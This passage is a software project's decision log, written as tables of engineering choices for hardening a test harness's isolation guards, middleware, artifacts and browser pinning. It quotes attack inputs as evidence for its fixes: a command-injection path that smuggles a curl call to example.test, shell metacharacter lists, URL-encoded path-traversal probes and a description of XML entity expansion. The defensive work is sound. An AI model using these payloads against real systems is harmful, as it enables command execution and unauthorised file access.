| D315 | Prime the second `platform` cache by calling `platform.platform()` beside the existing `platform.uname()` in the guard prologue, rather than widening the child-process allow-list. | (a) Add `ver` or `cmd` to the allow-list. (b) Leave `-n auto` broken and record it as unsupported. (c) Patch `platform.platform` for the session. | `pytest-xdist` workers call `platform.platform()` in `pytest_sessionstart`, which on Windows reaches `win32_ver` → `_syscmd_ver` → `subprocess.Popen('ver')` and is refused — so the worker aborts with an INTERNALERROR and "no tests ran". Priming the cache means the refused call never happens, which closes the failure without admitting a single new command; `uname()` and `platform()` fill *separate* caches, which is why the existing prologue line was not enough. (a) buys parallelism with a permanent hole in the guard. (b) leaves `README.md`'s claim that `-n auto` works false. (c) hides a real call behind a fake. | The fix depends on a CPython implementation detail — that `platform` memoises — and a release that stops memoising would reopen it as a loud failure rather than a silent one. Measured after the change: `-n 2` gives 802 passed, 3 skipped in 9.17 s; `-n auto` the same in 166 s. |
| D316 | **Supersedes the `includeConsoleOutput` third of D37.** Remove `includeConsoleOutput` from the `jest-junit` options. `addFileAttribute` and `reportTestSuiteErrors` stand as D37 took them. | (a) Keep it. (b) Keep it but stop the suites logging, by asserting on mocked loggers only. (c) Keep it and strip the artifact in a CI step. | D37 valued the correlated console lines, and they were real — but this suite deliberately drives production code that logs objects, so what actually landed in the retained artifact was six `<system-out>` sections whose CDATA carried production's raw logged objects *and* absolute host paths (`…\frontend\node_modules\redux\lib\redux.js:434`), in a file `ci.yml` uploads unconditionally. The correlation D37 wanted is already carried by `classname` and `name` plus the `file` attribute, so removing this option costs the artifact nothing it uniquely had. (b) rewrites tests to suit a reporter option. (c) adds a scrubbing step whose failure mode is silent. | A reader debugging from the JUnit stream alone no longer sees what a test logged and must re-run it. Verified on the emitted artifact rather than argued: `<system-out>` count 0 and host-path count 0, with `tests="371" failures="0"` intact. |
| D317 | Close the harness middleware's three same-origin holes: refuse `/__open-in-editor` in every spelling `connect` routes to it and then the whole `/__` control prefix behind it; replace the blanket `/@id/` bypass with membership in the exact `virtualModules` registry; and apply `isWithinAllowedRoot` to the **root-relative** branch as well as the `/@fs/` one. | (a) Keep the exact-string editor comparison and the blanket `/@id/` bypass. (b) Enumerate the editor spellings observed rather than refusing the prefix. (c) Disable the editor middleware through a Vite option. (d) Treat loopback as trusted and drop the middleware, since only this suite talks to it. | Each hole was a different way of trusting the harness's own origin. `connect`'s `use(route, handler)` matches case-insensitively **by prefix**, so `/__OPEN-IN-EDITOR`, a trailing slash, a sub-path and the `%3F`-encoded query form all reached an endpoint that spawns a local editor process from a request-supplied `file`. An unregistered `/@id/` request skipped every containment check and fell through to Vite's transform pipeline, which resolves what remains as a filesystem path. And `resolveRootRelativePath` preserves `..`, so `/%2e%2e/%2e%2e/frontend/package.json` resolved outside the harness root while matching no denied *name* — the deny list only ever covered sensitive names *inside* a root, so containment is the check that refuses it. (b) closes the spellings someone thought of. (c) is version-dependent and silent when the option is renamed. (d) is the assumption that produced all three. | Five refusal classes in one middleware, and a future Vite endpoint outside `/__` would not be covered. Bounded by `isolation.spec.ts` driving each class through `request.fetch`, which bypasses every `page.route` and so asserts the middleware rather than a browser-side rule. The traversal probes required a raw `node:http` request: both Chromium and Playwright's `APIRequestContext` normalise `..` and decode `%2e` before sending, so the first version of those tests passed a pre-resolved path and asserted nothing. |
| D318 | **Refines D47 and supersedes the retention half of D258 and D260.** Constrain end-to-end failure evidence in three places: set `use.trace` to the object form with `sources: false`; assert at the source that every credential literal is synthetic; and split artifact retention into 7 days for the two that carry failure evidence and 30 for the result streams, pinning the one upload that had inherited a default. | (a) Keep `trace: 'retain-on-failure'` and the uniform 30 days. (b) Also set `snapshots: false` and `screenshots: false`. (c) Turn trace, screenshot and video off for the credential spec. (d) Redact the values in the DOM before each failure. | D47 chose the mode and that choice stands; what it did not consider is that a trace also embeds a verbatim copy of every spec it executed, so `configuration.spec.ts`'s four credential literals were being packed into the artifact as *source text* on top of the DOM and network records. Dropping sources costs nothing — the source is in git at the same commit. (b) and (c) would gut the diagnosis the AAP requires (§0.4.6 mandates trace, screenshot and video on failure), and the AAP outranks a security heuristic here. The remaining residue genuinely cannot be configured away: two of the four fields render as `type="text"` and Playwright 1.44 offers no masking for automatic failure evidence — so it is bounded at the source instead, by a gate that fails the moment a value stops being recognisably synthetic. (d) mutates the subject. | The trace's Source tab is now empty, and a reader must open the repository at that commit instead. The synthetic-value gate is a test that asserts a property of the fixtures rather than of the subject — the same pattern as the zod honesty gates — and it protects the artifacts only for as long as someone keeps it green. Verified two-sidedly: with `sources: true` the trace zip carries an extra `src@<sha>.txt` entry holding the spec text; with `sources: false` that entry is absent. |
| D319 | **Supersedes the "always exits 0" characterisation of `browsers:verify` carried by D264 and by `TRACEABILITY-MATRIX.md` F97.** Bind the validated browser to the launched one: `require-browser.js` canonicalises through `realpathSync`, hashes the file, reports what this user could overwrite, and publishes `PLAYWRIGHT_CHROMIUM_EXECUTABLE_SHA256` beside the canonical path; `verify-browser.js` re-confirms that digest; and `playwright.config.ts` recomputes it and throws before the launch. | (a) Keep the `statSync` + `X_OK` check. (b) Canonicalise but do not hash. (c) Hash in the config only. (d) Pin an expected digest as a committed constant. | The gate and the launcher shared only a *path*, and a path is a mutable pointer: `/usr/bin/google-chrome` is a symlink on most distributions, and a browser this user can replace — which, measured in this container, includes the one under `Program Files` — can be swapped between the check and the launch. So the previous arrangement established that *a* launchable file existed, never that it was the file that ran. (b) closes repointing but not replacement. (c) leaves the resolving step's own answer unverified by the gate CI runs between them. (d) would have to be updated on every Chrome release and would fail closed on a legitimate upgrade. Route 3 — Playwright's own cache — supplies no executable path, so it is explicitly *not* bound, and says so where it is taken rather than being quietly counted as covered. | Three processes now hash the executable, once each, which the measurement puts under a second. A digest published by the same step that computed it is a consistency check rather than an attestation: it proves the file did not change between resolution and launch, and says nothing about where the file came from — the provenance residual D236 recorded is unchanged. |
| D320 | Reject threads this run started that are still alive at session end: report each one through the terminal reporter and set `session.exitstatus` to `TESTS_FAILED`, and join survivors against one shared `SURVIVOR_JOIN_TIMEOUT_SECONDS` budget before the guard is released. | (a) Release the guard as before and let a survivor outlive the run. (b) Warn without failing. (c) Join with a per-thread timeout. (d) Daemonise every thread the suite creates. | Releasing the guards while a thread the suite started is still running hands that thread an unguarded interpreter: whatever it does next — a socket, a subprocess — happens after every refusal is uninstalled and after the report is written, so it is both unrefused and invisible. (b) makes it a line nobody reads. (c) lets *n* survivors multiply the wait, turning a leak into a hang. (d) changes the behaviour under test. An xdist controller is exempt, because its workers are legitimately its own. | A test that intentionally leaves a long-lived thread now fails the session, and a slow-but-correct thread inside the budget is joined rather than reported. The budget test uses a simulated clock and stand-in threads rather than wall-clock timing — the first version of it passed alone and failed in the full run at `1.157 < 0.75`, because coverage tracing perturbs real timings, which is exactly the flake a timing assertion invites. |
| D321 | Ledger every same-origin request the harness serves as a census attachment, and abort-and-record any request to a dev-server control path before the API check. | (a) Keep `route.fallback()` for everything non-API, unrecorded. (b) Record only control paths. (c) Record nothing and rely on the server-side middleware alone. | The fixture claimed to account for every request a spec makes, and then fell through for all same-origin non-API traffic without recording it — so a Vite control path could reach the server with no trace in the report, and the document asserting the boundary had no evidence for the half that mattered. (b) leaves the module graph unaccounted, which is what makes the census useful as a positive record: it is what proves the four registered virtual ids still resolve after D317 tightened them. (c) is server-side only and cannot attribute a request to a test. | The census necessarily contains absolute host paths, because Vite's `/@fs/` and `/@id/` URLs *are* absolute paths — redacting them would destroy the thing the census exists to show. That is a different exposure from D316's: these are the request lines themselves rather than incidental log content, and a workspace path is not a credential. Recorded here so it reads as a decision. |
| D322 | **Refines the msw contract.** In `setup-jest.test.ts`, install the per-test override against the exact allowed origin (`${UNSET_BASE}/tweets`) instead of the wildcard `*/tweets`, and add a test that the same override does **not** claim that path on a foreign origin. | (a) Keep the wildcard, since the handler is scoped to one test. (b) Keep it and rely on `onUnhandledRequest: 'error'` to catch anything else. (c) Delete the override and assert against the default handler. | The file's whole subject is that the suite's HTTP boundary is anchored to one origin, and it was demonstrating that with a handler that would answer *any* host — so the one test most responsible for the claim was the one contradicting it. (b) does not help: a wildcard override makes the request handled, so `onUnhandledRequest` never fires and the breach is invisible. (c) removes the coverage. The added negative is what makes the anchoring falsifiable: it drives a remote URL and asserts the override recorded nothing, the request was rejected, and the breach is ledgered as `kind: 'unhandled-request'` with the exact URL. | One more test, and an override that must be updated if the base URL constant changes. Bounded by both tests deriving the origin from the same constant the production code does. |
| D323 | Refuse a report artifact that is oversized or declares a document type, raising a named `ArtifactRefused` rather than parsing it or returning the `None` that means "absent". | (a) Keep `ET.parse(path)`. (b) Use `defusedxml`. (c) Return `None` on refusal so the panels degrade. (d) Cap the size only, since external entities are already refused by the runtime. | Measured on the interpreter this script runs under (CPython 3.9.13) rather than assumed: `xml.etree.ElementTree` **does** expand internal entities — five nested ten-fold entities in a 350-byte document produced 100,000 characters — while an *external* entity is already refused (`ParseError: undefined entity`), so the live class is expansion and (d) leaves it open. Refusing `<!DOCTYPE` is a structural rule and not a pattern match, which is why it suffices: XML permits an entity declaration only inside a DTD, so a document without one has nothing to expand. (b) adds a dependency to a documentation helper and the AAP fixes the manifest. (c) would print "not produced" about a file sitting on disk — the same defect as a gate that cannot fail, which this project has already fixed once in D236. `ET.XMLParser` on 3.9 exposes no `.parser`, so expat's DTD handlers cannot be hooked; that was checked before choosing. | The DOCTYPE scan runs on the UTF-8 decoding, so a UTF-16 document carrying a DTD would not match the markers — it would also fail to parse, and no reporter in this project emits one. The 64 MiB bound is a judgement: the real artifacts are all under 101 KB. |
| D324 | Record every declined security finding in a new `docs/testing/SECURITY-GAPS.md`, each with the AAP clause that puts it out of scope, what an attacker could do with it, and what a human must do — rather than declining them in a review reply that the repository does not keep. | (a) Decline them in the remediation summary only. (b) Add them to §23's noted-but-not-fixed register. (c) Fix them, treating a security finding as overriding the AAP's scope. (d) List them without severities or attacker framing, to avoid publishing a target list. | A decline that lives only in a reply is indistinguishable, six months on, from a finding nobody noticed — and most of these are real: unauthenticated route handlers, f-string-interpolated SQL, a permanently-invalid Redux store. §23 was the near-miss option and it is the wrong home: it catalogues *defects observed while testing*, is organised by discovery, and mixing security exposure into it would bury the exposure in a list of typos. (c) is the one option that is not available — the AAP's write surface is frozen and §0.8.2 names these files explicitly, so "fix it anyway" means an unauthorized change to production code that this programme is a *test* deliverable for. (d) makes the register useless to the person who has to prioritise it. | A single file naming this repository's exploitable surface, in a repository that may become public. Accepted deliberately: every item is already visible in the source to anyone who reads it, none is a credential or a live endpoint, and the document's value is to the maintainer who must schedule the work. Bounded by the register carrying no secrets, no internal hostnames and no deployment detail. |
| D325 | Reconcile `blitzy-deck/executive-summary.html` to the delivered state and make the deck disclose its own residuals: replace the boundary diagram's `no network` / `no real credentials` node lines and the isolation slide's heading with the tested boundary, move the two run figures to the measured ones, add - in the file's own head comments - the meta-CSP framing residual, the retained `script-src 'unsafe-inline'`, the CDN dependency and the advisory-affected Mermaid pin, each pointing at `SECURITY-GAPS.md` §5, and declare `securityLevel: 'strict'` explicitly in `mermaid.initialize`. | (a) Fix the numbers and leave the absolutes, which is what shipped. (b) Delete the boundary claim from the diagram rather than restating it. (c) Put the residual disclosure on a content slide instead of in comments. (d) Also drop the CDN pins and vendor the three libraries, removing the network dependency the disclosure describes. | The deck said `no network` and `no real credentials` beside a suite that opens a real loopback socket to its own harness and types synthetic credentials into a form - claims a reader would act on, and the same overstatement the four onboarding documents carried. (b) loses the slide's point, which is that there **is** one boundary and it is worth naming. (c) fails Rule 4's forty-word content-slide cap and puts artifact-security detail in front of leadership; the closing slide carries the one line a reader needs, and the rest belongs where the exact wording lives. (d) contradicts Rule 4's pinned-CDN requirement and the single-self-contained-file form, and would put roughly 3 MB of third-party code in git. | The deck now states a boundary rather than an absolute, which reads as weaker even though it is what was tested. The framing residual is unfixable from inside the file - only an HTTP response header can carry `frame-ancestors` - so it is disclosed rather than closed, and the Mermaid pin stays advisory-affected by rule - `securityLevel: 'strict'` is the level 11.4.0 already defaults to, so declaring it buys legibility rather than protection, and it was verified in effect (`mermaid.mermaidAPI.getConfig().securityLevel === "strict"`) with all 41 authored `<br/>` label breaks still honoured rather than escaped. Two earlier rows, D235 and D251, record `5 of 5` diagrams from the five-diagram revision; the delivered file carries **six**, and `DASHBOARD-TEMPLATE.md` §7.4 is the current reading. |
| D326 | Repair the boundary diagram's five dangling edge ids - `L1 --> GUARD` .. `L5 --> GUARD` become `A --> GUARD` .. `E --> GUARD` - so the edges reference the five layer nodes the same diagram declares. | (a) Leave it: it renders without error and no reviewer had raised it. (b) Declare `L1`..`L5` as real nodes and label them. (c) Remove the five edges and let the cluster stand alone. | Mermaid silently invents a node for an undeclared id, so the slide painted **five empty boxes** feeding the isolation boundary while the five named layers sat disconnected inside their frame - a diagram contradicting the headline above it, on the one slide this checkpoint was already correcting for truthfulness. (b) doubles the node count for no meaning. (c) removes the relationship the slide exists to show. Found by browser verification, not by reading: the static structural checks pass either way, which is exactly why Rule 4 asks for a render. | A diagram edit on a slide already being edited, so the change lands in one place. Verified in headless Chrome across three separate renders through the deck's rebuild-on-revisit path: `g.node` 15 → **10**, `g.cluster` 2, ten edges with **both** endpoints resolving onto real nodes, zero empty labels, no `L1`..`L5` anywhere in the rendered text, 1470.46 × 595.20 px inside the 1920 × 1080 stage. |
| D327 | Record the deck's delivered body-word measurement instead of re-compressing eight content slides to meet it, and mark D205's figures as the count at the time of that decision. | (a) Re-compress every content slide to 40 words on D205's broadest reading. (b) Move the overflow into `<aside class="notes">` speaker notes. (c) Leave D205's numbers standing as if they described the delivered file. | D205 measured 28-37 words per content slide; the delivered file measures 47, 75, 35, 134, 37, 139, 111 and 61 on the same reading, because every later checkpoint added disclosure that reviewers had asked for - the two production-touch risk statements, the CI qualifications, the named limits. (a) would delete that disclosure to satisfy a presentation cap, which inverts the priority the last three reviews set. (b) fails the same measurement, since notes are text in the file. (c) is the defect this checkpoint exists to remove: a rationale column describing a file that no longer exists. | Rule 4's forty-word cap is met on none of the six slides that carry a table or a diagram label, and that is now stated rather than implied. Bounded by what is **not** in question: 16 sections within the 12-18 band, four slide types, at most four bullets per slide, a non-text visual on 16 of 16, zero emoji, zero fenced code blocks and the three pinned CDN versions with their four SRI digests - all re-verified in a browser at this checkpoint. A human who wants the cap enforced has to decide which disclosure to drop. |
| D328 | Record this checkpoint's eleven fail-closed demonstrations as `DASHBOARD-TEMPLATE.md` §7.3.4, a **separate** exercise from the 42-probe module-sensitivity ledger, and probe the three controls that had none. | (a) Fold them into §7.3.3's union, which is what D289 asks for on a literal reading. (b) Leave them out of the document and report them only in the checkpoint summary. (c) Record them but skip the three unprobed controls, since eight demonstrations already existed. | D289 requires the ledger to be the union of every sweep performed, and eight demonstrations had been performed and written nowhere - so (b) leaves the document below its own declared standard. But (a) would silently change a number the executive deck quotes on two slides and §7.2's A3 row states in terms, and it would conflate two different questions: §7.3.1 asks whether a suite notices a change to a production module, while these ask whether a control refuses. A guard that never denies anything passes every test written against it, which is the failure mode only a perturbation finds. (c) would have left the widened process guard's sibling control, the msw origin rule and the virtual-id allow-list - three of the seven fix groups - with no fail-closed evidence at all. | Two ledgers in one section, which a reader could add together. Bounded by the new subsection opening on what it is not and closing on why the arithmetic is unchanged, and by every row naming the decision row that owns the control. The three fresh probes each perturbed a file this checkpoint had already modified: each anchor was required to occur exactly once, each file was restored in a `finally` block, and each restoration was confirmed byte-identical by SHA-256 - `569a98fa…` for `conftest.py`, `4d46f98f…` for `setup-jest.test.ts`, `35a371dc…` for `vite.harness.config.ts`. |

## §37 Remediation of the final whole-project rules review — isolation, observability, explainability, onboarding and the deck

Scope: the decisions taken while closing the ten findings of the final whole-project Rules review — eight
major and two minor. Four groups are represented: the child-process isolation defect and the environment-file
publication defect; the two observability mechanics defects; the Rule 1 removal of rationale from
implementation comments; and the reconciliation of every governance document, onboarding guide and deck slide
to the delivered tree. Every row names the finding it closes so the review and this log can be read against
each other.

| # | Decision | Alternatives considered | Why this choice | Risks it carries |
|---|----------|-------------------------|-----------------|------------------|
| D329 | **Closes finding M8. Supersedes D223 and the child-process half of D105.** Refuse `os.system` unconditionally, and judge `subprocess.Popen` on the **structure** of its invocation rather than on the text of a rendered command line: `is_allowed_child_process(args, kwargs)` admits only an argument *vector* of exactly three members whose executable resolves — through `os.path.realpath` and `os.path.normcase` — into the trusted interpreter set built from `%COMSPEC%` and `%SystemRoot%\System32\cmd.exe`, whose remaining members are exactly `('/c', 'ver')`, which passes no truthy `shell`, and whose optional `executable=` override is itself trusted. `ALLOWED_CHILD_PROCESS_COMMANDS` and its regular expression are deleted. | (a) Tighten the regular expression to exclude shell metacharacters from the drive-path prefix. (b) Keep the regex but additionally reject any command line containing `& \| ; < > ^ $ \`` or a newline. (c) Remove the allowance entirely and let `platform.uname()` fail if it is ever reached under the guard. (d) Keep the regex and add the negative tests only, treating the finding as a test-coverage gap. | The allowance was a string match, and a string is the input a shell parses, so no amount of pattern tightening removes the class of defect — `C:\safe&curl https://example.test/cmd.exe /c ver` matched the shipped pattern and reached the real `os.system`, where the `&` starts a second command. (a) and (b) are denylists over an input the guard does not get to define; the structural form is an allowlist over values the guard resolves itself, which is why a metacharacter in a path is now simply a path that does not resolve to `cmd.exe`. (c) is close to free — the prologue calls `platform.uname()` before the guard is installed, which caches the answer for the whole process — but it would leave the guard with no positive case at all, so nothing would prove the admitting branch still works. (d) leaves the exploit in place. `os.system` takes only a command line, so there is no structural form for it and it is now refused for every command, including the allowed invocation. Measured: 130 cases in `backend/tests/test_guard_contract.py` pass, of which 45 are new negative cases covering ten metacharacter payloads as strings, thirteen as embedded path separators, an impostor `cmd.exe` outside the system directory, `shell=True` with the otherwise-allowed vector, an `executable=` override, and eight near-miss argument vectors. | The admitting branch is now narrower than the standard library's own call: CPython's `platform._syscmd_ver` invokes `cmd /c ver` with `shell=True` and a string, which this guard refuses. That is intended and it is safe only because the prologue populates `platform`'s cache before the guard is installed; a future standard-library change that re-queried the OS version mid-run would fail rather than egress, which is the correct direction but is a hard failure. The trusted set is also empty on a platform that names no `cmd.exe`, so the positive cases skip with a reason there rather than asserting against a path that does not exist. |
| D330 | **Closes the `Lock`/`RLock` half of finding M2. Refines D224.** Make `_OWNED_ENDPOINTS_LOCK` a `threading.RLock`, and state the reentrancy requirement beside it. | (a) Leave the lock as `threading.Lock` and correct D224's risk column to match. (b) Rename the constant in D224 only, leaving the type mismatch. | D224's risk column already recorded *why* the lock has to be reentrant — a weak-reference collection callback releases an endpoint during garbage collection, which can occur on a thread that already holds the lock — and the delivered code did not implement it, so the document was right and the code was wrong. (a) would reconcile the two by adopting the deadlock hazard the row was written to describe. The row's symbol name is also corrected here: it names `_BOUND_PORTS_LOCK`, which the refactor to endpoint identity renamed to `_OWNED_ENDPOINTS_LOCK`. | An `RLock` is slower than a `Lock` and it hides genuine double-acquisition in ordinary code paths, which a `Lock` would surface as a deadlock. Bounded by all six acquisition sites being short `with` blocks over two dictionaries. |
| D331 | **Not a review finding; found by executing the suite.** Poll the assertion in `e2e/tests/analytics.spec.ts` that React names `<TrendCharts>`, instead of reading the diagnostics ledger once. | (a) Assert only the Chart.js message and drop the component-name assertion. (b) Add a fixed wait before the assertion. (c) Assert on the attached ledger after the test rather than during it. | The case was failing in a real browser: the preceding `expect.poll` is satisfied by the `pageerror` record alone, and React emits its component-naming `console.error` afterwards, so a synchronous read saw one record where the test needed two. The spec was asserting a real property with a racy oracle. (a) discards the only assertion that ties the failure to the component under test. (b) is a sleep, which the plan's reliability constraints forbid. (c) moves the assertion out of the test that provoked it. Measured: the suite goes from 18 passed / 1 failed to 19 passed / 0 failed / 0 skipped in Chrome 151. | One more polled assertion, so a genuine regression in which React never names the component now takes the full settle timeout to report instead of failing immediately. |
| D332 | **Closes finding M4.** Add `frontend/coverage/lcov.info` to `dashboard-extract.py`'s `REQUIRED` contract, add a `lcov_is_usable()` usability check beside the existing result-stream checks, and compute the K2 trend and the K2 KPI cell as the minimum of all **twelve** independent gate percentages — `GATED_FRONTEND_PACKAGES` × `METRICS` — through the new `gated_frontend_percentages()` and `gated_frontend_worst()`, instead of summing the three packages and minimising four metrics. | (a) Add the artifact to `REQUIRED` and leave the aggregate K2 figure. (b) Fix K2 and leave the artifact contract, on the ground that the uncovered-line columns are informational. (c) Report all twelve percentages in the KPI cell rather than the worst plus the failing ones. (d) Drop the lcov read and print no uncovered-line columns. | The two halves are one defect with one cause — a figure that reads as measured while nothing measured it. `--require-all` exists so an absent artifact is fatal, and lcov was the sole source of every uncovered-line column while being the one artifact the contract did not name, so the flag could exit 0 with those columns blank. K2 had the mirror problem: Jest declares one `coverageThreshold` group per path, so a run is failed by the *worst group*, and `src/store` at 70% beside two packages at 100% aggregates to 98.57% — a published pass for a run Jest fails. (c) puts twelve numbers in a KPI cell nobody can scan; the cell now names the worst and then names every gate below the threshold, which is the information a reader needs and nothing more. (d) discards the per-file diagnosis the dashboard exists to carry. Usability is checked as well as presence, because an lcov with no `SF:`/`DA:` pair is present and measures nothing. Verified by 26 new cases in `backend/tests/test_dashboard_extract.py`, including the aggregate-hides-a-failure oracle stated in both directions. | The KPI cell no longer shows all four metrics at a glance, so a reader wanting the per-metric spread has to read §6.2. `lcov_is_usable()` also reads the whole artifact a second time, which is a few milliseconds on a file this size and would matter on a much larger tree. |
| D333 | **Closes finding M5. Applied to the `test:load` script D298 declares, which is the same run under the name the delivered manifest uses.** Make the frontend readiness gate `npm run test:load` — `jest --ci --watchAll=false --runInBand --reporters=default -t "__readiness_probe_that_matches_no_test__"` — retain its output at `frontend/reports/load-tests.txt` from its own `ci.yml` step, parse it with `jest_readiness()`, and keep `test:list` as the discovery census it actually is, in its own step retained at `frontend/reports/list-tests.txt`. | (a) Replace `test:list` with the readiness run and keep one script. (b) Make the readiness gate `jest --ci --coverage` — a full run — since that also loads every module. (c) Use `--onlyFailures` or `--findRelatedTests` to load without running. (d) Assert importability from a committed test that requires every test module. | `--listTests` enumerates the files that match discovery and resolves no import, so a module that throws while loading appears in its output and the step passes — which is what the finding says and what `frontend/TESTING.md` already admitted in its own §1. The name-filtered run loads and transforms all 24 modules, executes no test body, and exits non-zero on a load failure: measured at exit 1 with `1 failed, 24 skipped, 1 of 25 total` against a deliberately unresolvable import, where `test:list` exited 0 on the same tree. (a) loses the census, which `--list`-style output is genuinely good for and which the dashboard cross-checks against the result total. (b) is the 100-second `test:ci` run, so readiness would stop being a cheap early signal and a failure would be attributed to the suite rather than to loading. (c) does not load an unrelated module. (d) would need a second module graph maintained by hand. `--reporters=default` is mandatory: without it the readiness run overwrites `reports/jest-junit.xml` with a 370-case all-skipped stream, which is the stub-refusal defect H17 records in another layer. | Two frontend readiness artifacts now exist and a reader has to know which answers which question; `frontend/TESTING.md` §1 and §9 and `DASHBOARD-TEMPLATE.md` §6.4 each name both. The readiness run also costs about 13 seconds of transform work that `test:ci` then repeats, because the two runs do not share a Jest cache entry for the name filter. |
| D334 | **Closes finding M1, and is the remediation of conflict C2.** Reduce every comment in every changed code and configuration file to descriptive documentation — what the code does, what its contract is, what the production code under test does — plus a pointer to this log; and move every statement of an alternative, of why a choice was made, and of what a choice costs into this log. The terse `# TESTING:` markers on the two authorized production touches are untouched. | (a) Leave the comments and argue that a self-documenting test suite is the better reading of Rule 1. (b) Move only the explicit "(a)/(b) alternatives" passages and keep the "because" clauses. (c) Delete the flagged prose outright without recording anything here. (d) Convert the prose into `@see` pointers with no descriptive replacement. | Rule 1 makes this log the single source of truth for "why" and forbids that content in implementation comments, and the finding measured 41 changed files carrying it, so (a) is a re-argument of a rule rather than a fix. (b) leaves the same class of statement in place under different punctuation — the flagged text in `.coveragerc`, `.gitignore` and `pytest.ini` was almost entirely "X because a Y would Z", not enumerated alternatives. (c) would lose reasoning that nothing else records; every clause removed here is either already carried by an existing row or is carried by a row added in this section. (d) would leave a reader of the code unable to tell what a construct does without opening another document, which is the descriptive documentation the rule explicitly permits. The measurement used to close it ran in two passes over the 91 changed non-Markdown files. Pass one counted comment lines carrying a decision-flavoured marker — `deliberately`, `on purpose`, `the risk`, `the cost`, `alternatives`, `the choice`, `was chosen`, `previously`, `an earlier revision`, `why this`, `papering over` — which fell from 101 across 37 files to **0**. Pass two counted the scope-authorization form that pass one does not match — “which is production code this programme is not authorized to change, the two authorized touches are both in `backend/`” — which stood at seven sites (`frontend/src/components/Dashboard.test.tsx`, `TweetManagement.test.tsx`, `Analytics.test.tsx` and `Configuration.test.tsx`, `e2e/tests/analytics.spec.ts` and `configuration.spec.ts`, and `backend/tests/integration/test_route_surface.py`) and is now **0**; each site keeps the factual statement of the ceiling and its pointer to `frontend/TESTING.md` and the traceability matrix. The counterfactual `would`-clauses that remain describe runtime behaviour and what an assertion catches, not decisions. | Two costs, both real. A reader of a config file no longer sees why it is shaped that way without following the pointer, and the pointer is a relative path that a future move would break. And the boundary between "descriptive" and "argumentative" is a judgement: a sentence such as "`localhost` resolves to either `127.0.0.1` or `::1` depending on the host's resolver order" states a fact that happens to justify the adjacent literal, and it is kept on the ground that the fact is what a reader needs. A later reviewer drawing the line differently will find borderline cases. |
| D335 | **Closes finding m1.** Reject a candidate browser path carrying CR or LF in `isLaunchable()` before the filesystem is consulted, and publish `PLAYWRIGHT_CHROMIUM_EXECUTABLE` to `$GITHUB_ENV` in GitHub's delimited multi-line form — `NAME<<ghenv_<32 hex>`, the value, then the delimiter — regenerating the delimiter if it occurs in the value. | (a) Keep the `NAME=value` form and strip or escape CR and LF from the value.
